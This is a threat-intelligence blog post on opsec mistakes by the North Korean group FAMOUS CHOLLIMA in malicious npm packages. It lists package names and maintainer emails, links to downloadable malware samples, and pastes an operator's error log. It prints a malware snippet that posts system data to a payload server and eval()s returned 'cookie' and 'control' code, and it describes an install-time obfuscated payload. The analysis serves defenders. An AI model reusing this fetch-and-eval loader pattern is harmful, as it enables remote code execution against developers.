@@ -1,0 +1,172 @@
+---
+title: Exposed DPRK reference malware and logs
+description: Artifacts left behind in npm packages (part 2)
+date: 2026-02-16
+tags:
+ - javascript
+ - malware
+ - npm
+ - dprk
+---
+import Summary from "~/components/Summary.astro";
+import Callout from "~/components/Callout.astro";
+
+The LNK file mentioned in [part 1](/blog/dprk-opsec-1) is not the only operational 
+security (opsec) mishap by FAMOUS CHOLLIMA (hence why it's part 1 and this is part 2). In fact 
+there are many before and after these events but I'm tackling them in the order they appear in my brain.
+
+Below I disclose two historical accidental exposures in brief. As before, this isn't exactly actionable
+intelligence, but colourful detail for those who are tracking FAMOUS CHOLLIMA closely like me.
+
+<Summary>
+* Two exposed files reveal FAMOUS CHOLLIMA's operational procedures
+* Firstly, an `ordinary.txt` JavaScript source file that was exposed from July-September 2025, likely used as a reference point before modification and obfuscation
+* Secondly, a log file that reveals the OS and username of a FAMOUS CHOLLIMA operator: Windows and `dvant`, respectively
+</Summary>
+
+## `ordinary.txt`
+
+Several packages published from July to September 2025 contain the same `ordinary.txt` file:
+
+| name | version | released | maintainer | email |
+| :--- | :--- | :--- | :--- | :--- |
+| vite-postcss-nested | 0.0.2 | 2025-07-15 12:05:01 | vladislavkarniushka | vladkashka56[@]gmail.com |
+| vite-postcss-bootstrap | 0.0.4 | 2025-07-16 04:36:24 | hmax | hmax23410[@]gmail.com |
+| vite-postcss-helper | 3.0.4 | 2025-07-17 16:58:01 | goldenrhyno | goldenrhynodev[@]gmail.com |
+| vite-postcss-kit | 3.0.5 | 2025-07-21 11:27:40 | suhkuv.competition.tel | suhkuv.competition.tel[@]gmail.com |
+| vite-mobcss-log | 0.3.2 | 2025-08-04 05:33:08 | jeffbennett862 | jeffbennett862[@]gmail.com |
+| vite-plugin-uni-i18n | 1.0.2 | 2025-08-25 13:11:03 | jeffbennett862 | jeffbennett862[@]gmail.com |
+| vite-jsconfig | 0.3.2 | 2025-09-06 04:58:57 | thiago_chiago | realonlinethiago[@]gmail.com |
+| vite-jsconfig | 0.3.3 | 2025-09-06 05:04:34 | thiago_chiago | realonlinethiago[@]gmail.com |
+| dragon0905-vite-tsconfig-assistant | 1.0.3 | 2025-09-18 13:18:03 | dragon0905 | reichenausteve[@]gmail.com |
+| vite-tsconfig-assistant | 1.0.3 | 2025-09-18 01:47:11 | wonderful123 | aidanphillips721[@]gmail.com |
+
+<Callout type="info">
+Do you want to see these packages for yourself? Download the package tgz files from my research site!
+
+`https://dprk-research.kmsec.uk/api/tarfiles/{package_name}/{package_version}`
+
+for example: `https://dprk-research.kmsec.uk/api/tarfiles/vite-tsconfig-assistant/1.0.3`
+</Callout>
+
+`ordinary.txt` is a small JavaScript source file. You can download it from my
+research site:
+
+`https://dprk-research.kmsec.uk/api/samples/dcde20e9104c953246a379a54c2292e49add6601c77898972fd37912c985f470`
+
+I won't paste the full contents here for brevity -- you can view it yourself at 
+the URL above -- however I will highlight this snippet:
+
+```javascript
+...
+        // axios.post("http://localhost:4444/api/ipcheck", {...synfo, version})
+        // .then(r=>{
+
+        //     try {
+        //         eval(r.data.cookie);
+        //     } catch (err) {
+        //         console.log("Sorry, backend server is not working")
+        //     }
+
+        //     try {
+        //         eval(r.data.control);
+        //     } catch (err) {
+        //         console.log("Sorry, backend server is updating now")
+        //     }
+...
+```
+What's apparent is the basic and practical testing going on in this ordinary.txt
+sample:
+* Heavy usage of commenting out code blocks
+* Usage of a local payload server at :4444
+
+This underscores FAMOUS CHOLLIMA's simple yet effective approach to malware operations.
+
+Curiously, this "ordinary" malware is quite unlike the real payloads in these packages. For example, the real payload in
+`vite-jsconfig` simply evaluates remote content from remote endpoints and omits the information gathering or validation steps from ordinary.txt -- see `https://dprk-research.kmsec.uk/api/samples/c5e75f4641a5add4516c6785c3454160193f9a9eb835d96c9554305702a95911`.
+
+The inclusion of this `ordinary.txt` file is clearly a mistake, but not a huge one. No operational details 
+were exposed aside from the lax testing and development lifecycle.
+
+## `err.log`
+
+On 4 September 2025, npm user pavlo123123 (pavlovainerman[@]gmail.com) uploaded `some-promise`, a package that derives 
+code from the legitimate `any-promise` package.
+
+`some-promise` comes loaded with a malicious postinstall script that launches an embedded
+obfuscated payload at `/register/es-promise/license.list` (you can [view that sample](https://dprk-research.kmsec.uk/api/samples/d27c9f75c3f1665ee19642381a4dd6f2e4038540442cf50948b43f418730fd0a) - 
+chuck it into webcrack.netlify.app to see a partially deobfuscated OTTERCOOKIE sample). But what caught my eye was
+the  presence of an `err.log` file in the root of the package. It's qute small so I'll paste the contents here:
+
+```
+node:internal/modules/cjs/loader:1386
+  throw err;
+  ^
+
+Error: Cannot find module 'axios'
+Require stack:
+- C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js
+    at Function._resolveFilename (node:internal/modules/cjs/loader:1383:15)
+    at defaultResolveImpl (node:internal/modules/cjs/loader:1025:19)
+    at resolveForCJSWithHooks (node:internal/modules/cjs/loader:1030:22)
+    at Function._load (node:internal/modules/cjs/loader:1192:37)
+    at TracingChannel.traceSync (node:diagnostics_channel:322:14)
+    at wrapModuleLoad (node:internal/modules/cjs/loader:237:24)
+    at Module.require (node:internal/modules/cjs/loader:1463:12)
+    at require (node:internal/modules/helpers:147:16)
+    at eval (eval at <anonymous> (C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js:7:5), <anonymous>:1:6951)
+    at C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js:7:5 {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [
+    'C:\\Users\\dvant\\Documents\\UR_pavlo\\any-promise\\register\\es-promise\\license.js'
+  ]
+}
+
+Node.js v22.19.0
+node:internal/modules/cjs/loader:1386
+  throw err;
+  ^
+
+Error: Cannot find module 'axios'
+Require stack:
+- C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js
+    at Function._resolveFilename (node:internal/modules/cjs/loader:1383:15)
+    at defaultResolveImpl (node:internal/modules/cjs/loader:1025:19)
+    at resolveForCJSWithHooks (node:internal/modules/cjs/loader:1030:22)
+    at Function._load (node:internal/modules/cjs/loader:1192:37)
+    at TracingChannel.traceSync (node:diagnostics_channel:322:14)
+    at wrapModuleLoad (node:internal/modules/cjs/loader:237:24)
+    at Module.require (node:internal/modules/cjs/loader:1463:12)
+    at require (node:internal/modules/helpers:147:16)
+    at eval (eval at <anonymous> (C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js:7:5), <anonymous>:1:6951)
+    at C:\Users\dvant\Documents\UR_pavlo\any-promise\register\es-promise\license.js:7:5 {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [
+    'C:\\Users\\dvant\\Documents\\UR_pavlo\\any-promise\\register\\es-promise\\license.js'
+  ]
+}
+
+Node.js v22.19.0
+```
+<Callout type="info">
+You can also download the `err.log` from the DPRK research site!
+`https://dprk-research.kmsec.uk/api/samples/02fa6ff6ea920eb38ab040a2f2debef6d1bd4c4a2ea6684bfa131e773eecc195`
+</Callout>
+
+This error log reveals a few things:
+
+* Windows operating system (just like the operator in [part 1](/blog/dprk-opsec-1))
+* Username `dvant`
+* The filepath contains "UR_pavlo", which is possibly a reference to the FAMOUS CHOLLIMA operator masquerading as this pavlo123123 user (*you **are** pavlo!*)
+* The operator is highly likely modifying the legitimate `any-promise` package directly 
+in-place before publishing the malicious version, based on the filepath.
+* Even malware authors have a hard time getting their payloads working!
+
+## Assessment
+
+These file exposures aren't actionable in any meaningful way by defenders, but it does highlight 
+FAMOUS CHOLLIMA's poor operational security practices. 
+
+Despite their simple and sometimes accidentally transparent
+approach to malware operations, this doesn't stop them from being 
+an effective and harmful threat actor to the worldwide developer community.
